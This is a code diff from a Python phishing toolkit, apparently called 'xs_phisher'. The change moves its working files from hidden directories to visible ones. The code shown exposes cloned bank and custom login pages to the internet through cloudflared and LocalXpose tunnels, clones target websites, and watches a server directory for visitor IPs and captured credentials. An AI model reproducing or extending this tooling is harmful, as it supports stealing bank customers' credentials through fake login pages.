@@ -410,7 +410,7 @@ class Install_package:
 
     @staticmethod
     def install_cloudflared():
-        if os.path.exists(".server/cloudflared"):
+        if os.path.exists("server/cloudflared"):
             print("[+] Cloudflared already installed.")
         else:
             print("[*] Installing Cloudflared...")
@@ -427,11 +427,11 @@ class Install_package:
             else:
                 url = base_url + "cloudflared-linux-386"
 
-            Install_package.download(url, ".server/cloudflared")
+            Install_package.download(url, "server/cloudflared")
 
     @staticmethod
     def install_localxpose():
-        if os.path.exists(".server/loclx"):
+        if os.path.exists("server/loclx"):
             print("[+] LocalXpose already installed.")
         else:
             print("[*] Installing LocalXpose...")
@@ -448,7 +448,7 @@ class Install_package:
             else:
                 url = base_url + "loclx-linux-386.zip"
 
-            Install_package.download_and_extract(url, ".server/loclx")
+            Install_package.download_and_extract(url, "server/loclx")
 
 class Banking_Sites:
     # for the banking site
@@ -458,8 +458,8 @@ class Banking_Sites:
 
     # main menu for banks options
     def main_menu(self):
-        path = Software_info.current_path + "/.websites/"
-        path2serv = Software_info.current_path + "/.server/www/"
+        path = Software_info.current_path + "/websites/"
+        path2serv = Software_info.current_path + "/server/www/"
         while True:
             Utilities.clear_screen()
             print(xs_phisher_bank_banner)
@@ -565,7 +565,7 @@ class Tunnel:
         Install_package.install_cloudflared()
         # cleanup old log
         try:
-            os.remove(".server/.cld.log")
+            os.remove("server/.cld.log")
         except FileNotFoundError:
             pass
 
@@ -578,17 +578,17 @@ class Tunnel:
         cmd = []
 
         if is_termux:
-            cmd = ["termux-chroot", "./.server/cloudflared", "tunnel",
-                   "-url", f"{host}:{port}", "--logfile", ".server/.cld.log"]
+            cmd = ["termux-chroot", "./server/cloudflared", "tunnel",
+                   "-url", f"{host}:{port}", "--logfile", "server/.cld.log"]
         else:
-            cmd = ["./.server/cloudflared", "tunnel",
-                   "-url", f"{host}:{port}", "--logfile", ".server/.cld.log"]
+            cmd = ["./server/cloudflared", "tunnel",
+                   "-url", f"{host}:{port}", "--logfile", "server/.cld.log"]
 
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         time.sleep(8)
 
-        with open(".server/.cld.log", "r") as f:
+        with open("server/.cld.log", "r") as f:
             log = f.read()
 
         match = re.search(r'https://[-0-9a-z]*\.trycloudflare\.com', log)
@@ -599,7 +599,7 @@ class Tunnel:
 
     @staticmethod
     def localxpose_auth():
-        subprocess.Popen(["./.server/loclx", "-help"],
+        subprocess.Popen(["./server/loclx", "-help"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
 
@@ -610,7 +610,7 @@ class Tunnel:
             auth_f = os.path.join(os.path.expanduser("~"), ".localxpose/.access")
 
         # check if account has error
-        result = subprocess.run(["./.server/loclx", "account", "status"],
+        result = subprocess.run(["./server/loclx", "account", "status"],
                                 capture_output=True, text=True)
 
         if "Error" in result.stdout:
@@ -642,20 +642,20 @@ class Tunnel:
         is_termux = shutil.which("termux-chroot") is not None
 
         if is_termux:
-            cmd = ["termux-chroot", "./.server/loclx", "tunnel",
+            cmd = ["termux-chroot", "./server/loclx", "tunnel",
                    "--raw-mode", "http", "--region", loclx_region,
                    "--https-redirect", "-t", f"{host}:{port}"]
         else:
-            cmd = ["./.server/loclx", "tunnel",
+            cmd = ["./server/loclx", "tunnel",
                    "--raw-mode", "http", "--region", loclx_region,
                    "--https-redirect", "-t", f"{host}:{port}"]
 
-        with open(".server/.loclx", "w") as log_file:
+        with open("server/.loclx", "w") as log_file:
             subprocess.Popen(cmd, stdout=log_file, stderr=log_file)
 
         time.sleep(12)
 
-        with open(".server/.loclx", "r") as f:
+        with open("server/.loclx", "r") as f:
             log = f.read()
 
         match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', log)
@@ -696,7 +696,7 @@ class Custom_Template:
     def core_cust(self, site, domain):
         Utilities.pretty_print("Cloning the Website Please Wait. . .", "info")
         path = Software_info.current_path
-        base_path = os.path.join(path, ".custom-sites/")
+        base_path = os.path.join(path, "custom-sites/")
 
         try:
             result = subprocess.run([
@@ -722,7 +722,7 @@ class Core_Program:
     def __init__(self): # put init codes later
         self.program_setup()
 
-        WATCH_DIR = os.path.join(Software_info.current_path, ".server", "www")
+        WATCH_DIR = os.path.join(Software_info.current_path, "server", "www")
         ARCHIVE_DIR = os.path.join(Software_info.current_path, "auth")
 
         self.ip_file = os.path.join(WATCH_DIR, "ip.txt")
@@ -855,8 +855,8 @@ class Core_Program:
 
     
     def main(self): # where the core program starts
-        path = Software_info.current_path + "/.websites/"
-        path2serv = Software_info.current_path + "/.server/www/"
+        path = Software_info.current_path + "/websites/"
+        path2serv = Software_info.current_path + "/server/www/"
         while True:
             Utilities.clear_screen()
             print(xs_phisher_banner_smoll)
@@ -994,14 +994,14 @@ class Core_Program:
 
     def program_setup(self): # where users can finally configure
         path = Software_info.current_path + "/"
-        if not os.path.exists(path + ".server/www/"):
-            os.makedirs(path + ".server/www/")
+        if not os.path.exists(path + "server/www/"):
+            os.makedirs(path + "server/www/")
         
-        if not os.path.exists(path + ".websites/"):
-            os.makedirs(path + ".websites/")
+        if not os.path.exists(path + "websites/"):
+            os.makedirs(path + "websites/")
 
-        if not os.path.exists(path + ".custom-sites/"):
-            os.mkdir(path + ".custom-sites/")
+        if not os.path.exists(path + "custom-sites/"):
+            os.mkdir(path + "custom-sites/")
 
         if not os.path.exists(path + "auth/"):
             os.mkdir(path + "auth/")
